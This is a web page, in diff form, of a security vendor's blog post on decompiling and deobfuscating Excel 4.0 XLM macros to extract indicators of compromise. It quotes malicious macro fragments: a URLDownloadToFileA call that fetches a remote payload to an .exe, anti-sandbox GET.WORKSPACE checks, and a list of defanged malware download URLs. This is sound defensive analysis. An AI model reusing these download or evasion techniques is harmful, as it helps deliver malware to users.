@@ -1,0 +1,537 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="robots" content="index, follow">
+    <meta name="description" content="Automated malware analysis with Hatching Triage, the high-volume sandbox solution for SOCs, CERTs, SOARs, and MSSPs.">
+    <meta name="keywords" content="Hatching, Hatching Triage, Sandbox, Malware Analysis, Automated Malware Analysis">
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0">
+    <meta name="revisit-after" content="3 days">
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:site" content="@hatching_io">
+    <meta name="twitter:title" content="Hatching - Automated malware analysis solutions">
+    <meta property="og:title" content="Hatching - Automated malware analysis solutions">
+    <meta property="og:description" content="Automated malware analysis with Hatching Triage, the high-volume sandbox solution for SOCs, CERTs, SOARs, and MSSPs.">
+    <meta property="og:url" content="https://www.hatching.io">
+    <link rel="manifest" href="/static/manifest.json">
+    
+      <meta property="og:image" content="https://www.hatching.io/static/images/backgrounds/resized-39.jpg">
+      <meta name="twitter:image" content="https://www.hatching.io/static/images/backgrounds/resized-39.jpg">
+    
+    
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-123677703-1"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+
+      gtag('config', 'UA-123677703-1');
+    </script>
+    <link rel="stylesheet" href="https://hatching.io/static/css/index.css?1726233262">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://hatching.io/static/images/favicon-32x32.png?v=21">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://hatching.io/static/images/favicon-16x16.png?v=21">
+    <title>Excel 4.0 XLM Extraction</title>
+  </head>
+  <body>
+<nav class="site-menu">
+  <ul>
+    <li><a href="/">Home</a></li>
+    <li><a href="/about/">About</a></li>
+    <li><a href="/triage/">Triage</a></li>
+    <li><a class="active" href="/blog/">Blog</a></li>
+    <li><a  href="https://boards.greenhouse.io/recordedfuture" rel="nofollow">Jobs</a></li>
+    <li><a href="https://go.recordedfuture.com/enterprise-sandbox-contact-us" target="_blank">Contact</a></li>
+  </ul>
+</nav>
+<header class="site-nav headroom theme-light">
+  <div class="logo">
+    <a href="/">
+      <img width="210px" src="https://hatching.io/static/images/rf-hatching-black.svg" width="164">
+    </a>
+  </div>
+  <div>
+    <a href="#" class="toggle-menu">
+      Menu
+      <span></span>
+      <span></span>
+      <span></span>
+    </a>
+  </div>
+</header>
+
+
+<section class="scheme-1 view-context blog-fold blog-article-head" id="fold" data-keep="true">
+  <div class="view-context__body">
+    <div>
+      <div>
+        
+          <h5>Office</h5>
+        
+        <h2>Excel 4.0 XLM Extraction</h2>
+      </div>
+      <ul>
+        <li>Share this:</li>
+        <li class="social">
+          <a href="https://twitter.com/hatching_io" target="_blank">
+            <i class="icon-twitter"></i>
+          </a>
+          <a href="https://www.linkedin.com/company/hatching" target="_blank">
+            <i class="icon-linkedin"></i>
+          </a>
+          <a href="https://www.github.com/hatching" target="_blank">
+            <i class="icon-github"></i>
+          </a>
+        </li>
+      </ul>
+    </div>
+    <div>
+      <h1>Blog.</h1>
+    </div>
+  </div>
+  <div class="background-graphic">
+    
+      <div class="image" style="background-image: url('/static/images/backgrounds/resized-39.jpg');"></div>
+    
+  </div>
+</section>
+
+<article class="view-context blog-article">
+  <header class="blog-article-meta">
+    <div class="blog-article-general">
+      <p><time datetime="2020-04-09T00:00:00Z">2020-04-09</time></p>
+        
+          <ul class="blog-article-tags">
+            <li><p><a href="/blog/#category=triage">triage</a></p><li><p><a href="/blog/#category=excel">excel</a></p><li><p><a href="/blog/#category=xlm">xlm</a></p><li><p><a href="/blog/#category=macro">macro</a></p>
+          </ul>
+        
+    </div>
+    <div class="blog-article-author">
+      <div class="avatar">
+        <img src="/static/images/avatars/nikos.svg" />
+      </div>
+      <div>
+        <h5>Written by <br />Team</h5>
+      </div>
+    </div>
+  </header>
+  <section class="blog-article-body">
+    
+      <h2 id="introduction">Introduction</h2>
+<p><strong>Note: for those interested, yes, we&rsquo;ve compiled a list of IOCs from a few
+thousand XLM Macro-enabled Microsoft Excel documents. These are listed at the
+end of the blogpost.</strong></p>
+<p>Over the last couple of years an alternative to Microsoft Office&rsquo;s VBA macros
+has been increasingly gaining attention from malware authors looking to evade
+common detection methods. XLM macros - often referred to as Excel 4.0 macros -
+were the predecessor to VBA scripting in Office, available in early versions of
+the software up to Excel 4.0 (released in 1992). Subsequent versions no longer
+supported the creation of these macros, but continue to include the ability to
+execute them all the way up to current Office releases. 28 years on if a user
+opens a file containing them the scripts will still run, but many security
+products may not be looking for them, focusing instead on the more common VBA form.</p>
+<p>Noticing this increase in activity, we have recently been working to implement
+extraction of IoCs from these XLM macros, and are pleased to say that this feature
+is now available on <a href="https://tria.ge">tria.ge</a>.</p>
+<p>(Another note: this blogpost doesn&rsquo;t touch the payloads dropped by these XLM
+Macro documents, we&rsquo;ll get back on that next week).</p>
+<h4 id="background">Background</h4>
+<p>Unlike VBA macros, XLM versions are not bundled with the file as a separate object -
+they are written directly in the spreadsheet cells, much like Excel formulas.
+There are a few different ways in which these macros are hidden from prying
+eyes, ranging from the low-tech - make the text color white and paste an image
+over the top of the cells - to the more advanced - manipulating metadata for a
+sheet in the workbook to hide it, requiring the modification of a hex value in the
+file to make it visible again.</p>
+<p>These approaches are covered extensively in blogposts published by others, such as
+<a href="https://inquest.net/blog/2020/03/18/Getting-Sneakier-Hidden-Sheets-Data-Connections-and-XLM-Macros">Inquest&rsquo;s analysis</a>
+of 2 samples from early 2020 or
+<a href="https://isc.sans.edu/forums/diary/A+Safe+Excel+Sheet+Not+So+Safe/25868/">Xavier Mertens&rsquo; blog</a>
+on a similar example, so we won&rsquo;t cover the details again here. Instead, this
+blogpost aims to provide details on how we have approached automated extraction of
+these macros, and what information that makes available through Triage analyses. It
+will also include examples, to highlight the uses of the new feature.</p>
+<p>For reference, the following blogposts/tweets provide further details on malicious XLM in addition to those mentioned above:</p>
+<ul>
+<li><a href="https://clickallthethings.wordpress.com/2020/04/06/covid-19-excel-4-0-macros-and-sandbox-detection/">https://clickallthethings.wordpress.com/2020/04/06/covid-19-excel-4-0-macros-and-sandbox-detection/</a></li>
+<li><a href="https://twitter.com/Ledtech3/status/1246237826041229317">https://twitter.com/Ledtech3/status/1246237826041229317</a></li>
+<li><a href="https://twitter.com/JohnLaTwC/status/1245852289476096000">https://twitter.com/JohnLaTwC/status/1245852289476096000</a></li>
+</ul>
+<h2 id="xlm-macros-101">XLM Macros 101</h2>
+<p>We start with the sample from <a href="https://isc.sans.edu/forums/diary/A+Safe+Excel+Sheet+Not+So+Safe/25868/">Xavier&rsquo;s blogpost</a>. This one is relatively
+straightforward: the macros are just there and there&rsquo;s no obfuscation. You
+can even fetch the URLs straight from the binary by just looking at hexdump:</p>
+<pre tabindex="0"><code>0a 00 00 ff 98 00 17 06  00 75 72 6c 6d 6f 6e 17  |.........urlmon.|
+12 00 55 52 4c 44 6f 77  6e 6c 6f 61 64 54 6f 46  |..URLDownloadToF|
+69 6c 65 41 17 06 00 4a  4a 43 43 4a 4a 1e 00 00  |ileA...JJCCJJ...|
+17 40 00 68 74 74 70 3a  2f 2f 73 61 6d 70 68 61  |.@.http://sampha|
+6f 70 65 74 2e 63 6f 6d  2f 77 70 2d 63 6f 6e 74  |opet.com/wp-cont|
+65 6e 74 2f 75 70 6c 6f  61 64 73 2f 32 30 32 30  |ent/uploads/2020|
+2f 30 32 2f 69 64 6c 65  2f 31 31 31 31 31 31 2e  |/02/idle/111111.|
+70 6e 67 17 1e 00 63 3a  5c 55 73 65 72 73 5c 50  |png...c:\Users\P|
+75 62 6c 69 63 5c 61 73  64 32 61 73 66 66 33 32  |ublic\asd2asff32|
+2e 65 78 65 1e 00 00 1e  00 00 42 08 96 00 06 00  |.exe......B.....|
+cd 00 07 00 00 00 42 00  01 00 00 00 00 00 ff ff  |......B.........|
+</code></pre><figure><img src="https://isc.sans.edu/diaryimages/images/isc-20200306-2.PNG"><figcaption>
+      <h4>Basic XLM</h4>
+    </figcaption>
+</figure>
+
+<p>In order to automatically and correctly extract the URLs, we wrote a Microsoft
+Excel Macro decompiler. The macro bytecode is a relatively straightforward
+<a href="https://en.wikipedia.org/wiki/Stack_machine">stack machine</a>. A snippet of the
+decompiled AST may look as follows:</p>
+<pre tabindex="0"><code>formula.CallStmt{
+  Name: &#34;CALL&#34;
+  Args: [
+    &#34;urlmon&#34;
+    &#34;URLDownloadToFileA&#34;
+    &#34;JJCCJJ&#34;
+    0
+    &#34;hxxp://samphaopet[.]com/wp-content/uploads/2020/02/idle/111111.png&#34;
+    &#34;c:\\Users\\Public\\asd2asff32.exe&#34;
+    0
+    0
+  ]
+}
+</code></pre><p>The list of extracted macros as well as extracted IOCs (URLs) can be found
+at the following analysis: <a href="https://tria.ge/reports/200409-4eb6rljnsx/static1">https://tria.ge/reports/200409-4eb6rljnsx/static1</a></p>
+<p>For the curious reader: yes, in the
+<a href="https://tria.ge/reports/200409-4eb6rljnsx/static1">Triage analysis above</a>
+we also took the time to translate the decompiled formulas back to a textual
+representation for easy inspection, so the formulas listed in this report are
+the human readable version of what&rsquo;s in the Excel document ;-)</p>
+<h2 id="webquery-and-anti-sandboxing">Webquery and anti-sandboxing</h2>
+<p>The first sample from the <a href="https://inquest.net/blog/2020/03/18/Getting-Sneakier-Hidden-Sheets-Data-Connections-and-XLM-Macros">Inquest blogpost</a> is actually using Webquery to
+fetch macros from a remote server through a simple HTTP request, which is
+also interesting. However, it also employs macros to perform anti-sandboxing
+by closing the Office application as
+<a href="https://tria.ge/reports/200409-65h72tpm5s/static1">can be seen here</a>:</p>
+<pre tabindex="0"><code>IF(GET.WORKSPACE(19),,CLOSE(TRUE))
+IF(GET.WORKSPACE(42),,CLOSE(TRUE))
+RETURN()
+</code></pre><p>(It should be noted that <code>GET.WORKSPACE(19)</code> returns true if and only if a
+mouse is present and <code>GET.WORKSPACE(42)</code> returns true if and only if sound can
+be played on the computer).</p>
+<h2 id="crafting-macros-at-runtime">Crafting Macros at Runtime</h2>
+<p>Of course XLM wouldn&rsquo;t be a true scripting language if it weren&rsquo;t for the
+ability to create XLM macros at runtime using the <code>FORMULA</code> method.
+Below you&rsquo;ll find a small snippet of the FORMULA method where its string
+argument is being constructed dynamically through numerous concatenate
+statements (each being something like <code>&quot;A&quot; &amp; &quot;B&quot;</code>).</p>
+<pre tabindex="0"><code>formula.CallStmt{
+  Name: &#34;FORMULA&#34;
+  Args: [
+    formula.ConcatStmt{
+      Left: formula.ConcatStmt{
+        Left: formula.ConcatStmt{
+          Left: formula.ConcatStmt{
+            Left: formula.ConcatStmt{
+              Left: formula.ConcatStmt{
+                Left: formula.ConcatStmt{
+                  Left: formula.ConcatStmt{
+                    Left: formula.ConcatStmt{
+                      Left: formula.ConcatStmt{
+                        Left: formula.ConcatStmt{
+                          Left: formula.ConcatStmt{
+                            Left: Ref{0 16}
+                            Right: Ref{2 16}
+                          }
+                          Right: Ref{3 16}
+                        }
+                        Right: Ref{4 16}
+                      }
+                      Right: Ref{5 16}
+                    }
+                    Right: Ref{6 16}
+                  }
+                  Right: Ref{8 16}
+                }
+                Right: Ref{9 16}
+              }
+              Right: Ref{10 16}
+            }
+            Right: Ref{11 16}
+          }
+          Right: Ref{12 16}
+        }
+        Right: Ref{13 16}
+      }
+      Right: Ref{14 16}
+    }
+    Ref{19 18}
+  ]
+}
+</code></pre><p>(Mind you, this was basically the shortest FORMULA sequence we could find..)</p>
+<p>Each <code>Ref{Row Col}</code> entry is a reference to another cell, so the above
+formula actually looks more like <code>=FORMULA(Q1 &amp; Q3 &amp; Q4 &amp; ...)</code>. Then, to make
+things better, those cells don&rsquo;t contain strings, but instead also contain
+macros. In this example cell Q1 contains <code>=CHAR(61)</code> which translates to the
+<code>&quot;=&quot;</code> string (associated AST listed below).</p>
+<pre tabindex="0"><code>formula.CallStmt{
+  Name: &#34;CHAR&#34;
+  Args: [
+    61
+  ]
+}
+</code></pre><p>In the static analysis component of <a href="https://tria.ge/">Triage</a> we&rsquo;ve essentially implemented a full deobfuscation layer on top of the macro decompiler, essentially optimizing away these obfuscation layers.
+<a href="https://tria.ge/reports/200409-41b3rw1bqa/static1">Submitting the sample</a>
+from the following <a href="https://x.com/Ledtech3/status/1246237416429625346">tweet</a> will therefore once again provide you with
+the related IOCs.</p>
+<p>In fact, as can <a href="https://tria.ge/reports/200409-41b3rw1bqa/static1">be seen in the analysis</a>,
+Triage will provide the dynamically constructed macros too, allowing one to
+quickly inspect their overall behavior and identify potential anti-sandboxing
+techniques in use.</p>
+<h2 id="xlm-macros-hardcore-mode">XLM Macros: Hardcore mode</h2>
+<p>Finally we move onto the last sample for today:
+<a href="https://tria.ge/reports/200409-vmw4mgq77e/static1">https://tria.ge/reports/200409-vmw4mgq77e/static1</a></p>
+<p>It&rsquo;s similar to the sample discussed in this <a href="https://x.com/Ledtech3/status/1246237416429625346">tweet</a>.</p>
+<p>For those reading carefully, you might notice that this time the CHAR argument
+is subtracting a number from a cell reference. In our AST this looks roughly
+as follows:</p>
+<pre tabindex="0"><code>formula.CallStmt{
+  Name: &#34;CHAR&#34;
+  Args: [
+    formula.SubStmt{
+      Left: Ref{1704 121}
+      Right: 983
+    }
+  ]
+}
+</code></pre><p>The XLM Macros in this document also have other interesting features like
+recursive references and references through the XLM Macro <code>RUN</code> method as well
+as cells that have their value populated twice. Once by what Microsoft called
+<code>SST</code> (probably meaning sorted string table) and once by a regular integer
+(which, of course, is stored internally as a floating point).</p>
+<p>There are some other interesting &ldquo;features&rdquo; about these Excel documents and
+how their data is being stored, because Excel has a number of optimizations to
+reduce storage space, e.g., resulting in multiple cells with the same value
+being stored in a different manner than other data. Or formulas working on
+multiple cells. Or XLM Macros creating infinite loops through references. Or
+Excel featuring almost a dozen different ways to store strings depending on
+the data type that needs it, etc.. In other words: a joy to work on!</p>
+<h2 id="excel-related-iocs">Excel related IOCs</h2>
+<p>We&rsquo;ll be working on generating more IOCs related to XLM Macro-enabled
+documents both by active research from our side as well as from people
+submitting relevant samples to <a href="https://tria.ge/">our public cloud</a>.</p>
+<p>For now we&rsquo;ve compiled the following list of IOCs based on a couple thousand
+XLM Macro-enabled documents: <a href="https://hatching.io/static/files/xlm1.json">https://hatching.io/static/files/xlm1.json</a></p>
+<pre tabindex="0"><code>    354 hxxps://rwtkoaqe[.]club/adfbr53g
+    289 hxxp://fcowhcwsb[.]space/erg4ewr1
+    262 hxxps://waitupdate[.]xyz/deg34g
+    181 hxxps://pxdgcvnsb[.]xyz/aaeg4df12
+    143 hxxps://veqejzkb[.]xyz/SDVe2f2fds
+    136 hxxps://merystol[.]xyz/6ng688x8
+    135 hxxps://cdncloudtech[.]xyz/deg34g
+    130 hxxps://emmnebuc[.]xyz/SDVJKBsdkhv1
+    127 hxxps://cdncloudtech[.]xyz/bag4hy
+    122 hxxps://doolised[.]xyz/DSBVhsdv78f
+    119 hxxps://pnxkntdl[.]xyz/KJSDBViad7
+    111 hxxp://wrjmkdod[.]xyz/KDHBVsd7v8
+     99 hxxps://fbknuele[.]pw/ajt1eg4fh3a
+     93 hxxps://paxtontranter[.]xyz/rv24t2
+     91 hxxps://amberlessard[.]xyz/brg2sv
+     89 hxxps://tdvomds[.]pw/12341324rfefv
+     89 hxxps://fbknuele[.]pw/aagaeg4df12
+     72 hxxps://merystol[.]xyz/DVkjbsdv37
+     71 hxxps://cworld[.]top/wp-front.php
+     71 hxxps://assemble[.]sg/wp-front.php
+     69 hxxps://tozcftdl[.]xyz/SDVjkhb7831r
+     65 hxxps://wrjmkdod[.]xyz/SDFwef2fvbbe
+     65 hxxps://pnxkntdl[.]xyz/KDSBVksdhv778a
+     61 hxxps://efbzfyvsb[.]website/f2f23
+     60 hxxps://ddfspwxrb[.]club/fb2g424g
+     58 hxxps://amgdorie[.]online/avdv43g
+     55 hxxps://rosannahtacey[.]xyz/vg43
+     54 hxxps://hxzfvomd[.]buzz/asf2f1ff
+     52 hxxps://ethelenecrace[.]xyz/fbb3
+     51 hxxps://emmnebuc[.]xyz/vbdh72F
+     50 hxxps://pjtcdnrd[.]pw/ckjbvkf732
+     49 hxxps://pxdgcvnsb[.]xyz/ajt1eg4fh
+     49 hxxps://pjtcdnrd[.]pw/fsgbfgbfsg43
+     47 hxxp://tubolso[.]cl/wp-content/uploads/2020/02/white/444444.png
+     47 hxxp://murreeweather[.]com/wp-content/white/444444.png
+     47 hxxp://freespacemarketing[.]com/wp-content/uploads/2020/02/white/444444.png
+     47 hxxp://batilservice[.]xyz/wp-content/uploads/2020/02/white/444444.png
+     45 hxxps://tdvomds[.]pw/fgwg24g24g
+     42 hxxps://amgdorie[.]online/avdv42g
+     42 hxxp://kacper-formela[.]pl/wp-smart.php
+     42 hxxp://braeswoodfarmersmarket[.]com/wp-smart.php
+     36 hxxps://uenoeakd[.]site/grwrg24g2g
+     34 hxxps://emmnebuc[.]xyz/DSKVJBdsj2
+     29 hxxp://209[.]141.54.161/crypt.dl
+     26 hxxp://uniluisgpaez[.]edu.co/wp-content/uploads/2020/02/idle/444444.png
+     26 hxxps://wgyafqtc[.]online/fgwg24g24g
+     26 hxxp://samphaopet[.]com/wp-content/uploads/2020/02/idle/111111.png
+     26 hxxp://icietdemain[.]fr/contents/2020/02/idle/222222.png
+     26 hxxp://careers[.]sorint.it/idle/33333.png
+     21 hxxps://narensyndicate[.]com/wp-crun.php
+     21 hxxps://greentec-automation[.]com/wp-crun.php
+     14 hxxps://studyshine[.]in/wp-cryn.php
+     14 hxxps://arturkauf[.]pl/wp-cryn.php
+     14 hxxp://march262020[.]club/files/bot.dl
+     14 hxxp://lorrainehomeconsulting[.]com/wp-content/uploads/2020/02/trusty/187213.png
+     14 hxxp://g2creditsolutions[.]com/trusty/444444.png
+     12 hxxps://tdvomds[.]pw/1451345341fff
+      9 hxxps://orruucsl[.]xyz/fdgareg34g
+      7 hxxps://narensyndicate[.]com/wp-cran.php
+      7 hxxps://greentec-automation[.]com/wp-cran.php
+      7 hxxp://gengrasjeepram[.]com/sv.exe
+      5 hxxps://wrjmkdod[.]xyz/vdjfvfs7871f
+      5 hxxps://doolised[.]xyz/SDVJbsldkcvg1
+      4 hxxps://gartnerkvartalet[.]no/wp-content/themes/calliope/wp-front.php
+      4 hxxps://assemble[.]sg/wp-frunt.php
+      3 hxxps://doolised[.]xyz/test
+      3 hxxp://209[.]141.54.161/files/crypt.dl
+      2 hxxps://wgyafqtc[.]online/sgfbsb4
+      1 hxxps://nonnewspaper[.]com/bot.dl
+      1 hxxps://merystol[.]xyz/qY3DRY3N
+      1 hxxps://grpxmqnrb[.]pw/ehrj4g9g
+      1 hxxp://fikima[.]com/axel.ex
+      1 hxxp://fibercemper[.]com/wild.ex
+      1 hxxp://209[.]141.54.161/crypt18.dl
+</code></pre><p>This list contains the following IOCs as well as all related sample hashes,
+XLM Macros, and Webquery IOCs.</p>
+<h2 id="conclusion">Conclusion</h2>
+<p>Sign up to <a href="https://tria.ge/">Triage</a> today and analyze XLM Macro files and
+many more file types and malware families the rest of the year.</p>
+<p>Last but not least, in the future we&rsquo;re also looking to provide access for our
+users to the AST that&rsquo;s generated such that new obfuscation techniques can be
+studied not only by our team, but also by our users!</p>
+<p>We hope you enjoyed this blogpost and stay tuned for more :-)</p>
+
+    
+  </section>
+</article>
+
+
+<section class="view-context blog-recommendations">
+  <article class="view-context__body">
+    <h2>You may also like:</h2>
+    
+    <ul>
+      
+        <li>
+          <h3>Ep. 113: Triage Thursday</h3>
+          <br>
+          <a class="button button-variant-3" href="https://hatching.io/blog/tt-2024-01-04/">Read</a>
+        </li>
+      
+        <li>
+          <h3>A Year in Review, Plus Detection Updates</h3>
+          <br>
+          <a class="button button-variant-3" href="https://hatching.io/blog/2021-review/">Read</a>
+        </li>
+      
+        <li>
+          <h3>Ep. 103: Triage Thursday</h3>
+          <br>
+          <a class="button button-variant-3" href="https://hatching.io/blog/tt-2023-10-05/">Read</a>
+        </li>
+      
+        <li>
+          <h3>Updates for IcedID, Mercurial, Allcome and Qakbot</h3>
+          <br>
+          <a class="button button-variant-3" href="https://hatching.io/blog/tt-2022-02-17/">Read</a>
+        </li>
+      
+    </ul>
+  </article>
+</section>
+    <footer class="scheme-4 view-context footer" id="contact">
+      <article class="view-context__body">
+        <h2>Want to know more?<br />Get in touch!</h2>
+        <a class="button button-variant-1" target="_blank" href="https://go.recordedfuture.com/enterprise-sandbox-contact-us" i>Contact us</a>
+        <ul>
+          <li>
+            <ul>
+              <li class="logo"><img src="https://hatching.io/static/images/rf-hatching-white.svg" alt="hatching"/></li>
+              <li class="social">
+                <a href="https://twitter.com/hatching_io" target="_blank">
+                  <i class="icon-twitter"></i>
+                </a>
+                <a href="https://www.linkedin.com/company/hatching" target="_blank">
+                  <i class="icon-linkedin"></i>
+                </a>
+                <a href="https://www.github.com/hatching" target="_blank">
+                  <i class="icon-github"></i>
+                </a>
+              </li>
+            </ul>
+          </li>
+          <li>
+            Hatching International B.V.<br />
+            The Netherlands<br/>
+            <br />
+            Email us: <a href="mailto:info@hatching.io">info@hatching.io</a>
+          </li>
+          <li>
+            IBAN: NL52 INGB 0006 9672 73<br />
+            BIC: INGBNL2A<br />
+            ING Groep N.V.<br />
+            Amsterdam-Zuidoost<br />
+            <br />
+            REG: 64146707<br />
+            VAT: NL855541891B01
+          </li>
+        </ul>
+      </article>
+      <div class="form hidden">
+        <div class="form-logo">
+          <img src="https://hatching.io/static/images/rf-hatching-white.svg" alt="Hatching"/>
+        </div>
+        <a href="#" class="form-close" title="Close (or press esc)"></a>
+
+        <div class="container">
+          <h1>Contact us</h1>
+          <h3>Feel free to inquire or request about our services.</h3>
+          <form>
+            <fieldset>
+              <div class="field">
+                <div class="input is-required">
+                  <input id="form-name" name="name" placeholder="Name" />
+                </div>
+              </div>
+              <div class="field">
+                <div class="input is-required">
+                  <input id="form-email" name="email" placeholder="Email" />
+                </div>
+              </div>
+              <div class="field">
+                <div class="input">
+                  <input id="form-phone" name="phone" placeholder="Phone number" />
+                </div>
+              </div>
+              <div class="field">
+                <div class="input">
+                  <input id="form-company" name="company" placeholder="Company" />
+                </div>
+              </div>
+            </fieldset>
+            <fieldset>
+              <div class="input required">
+                <textarea id="form-message" name="message" placeholder="Write a message"></textarea>
+              </div>
+              <div class="button-group">
+                <button type="reset" class="button button-variant-2 button-transparent">Reset</button>
+                <button type="submit" class="button button-variant-1">Send</button>
+              </div>
+            </fieldset>
+          </form>
+        </div>
+
+      </div>
+    </footer>
+    <script src="https://hatching.io/static/js/hatching.js?1726233262"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+          if(window.main && window.main instanceof Function) {
+            window.main();
+          }
+          initForm();
+
+          
+          
+        });
+    </script>
+  </body>
+</html>
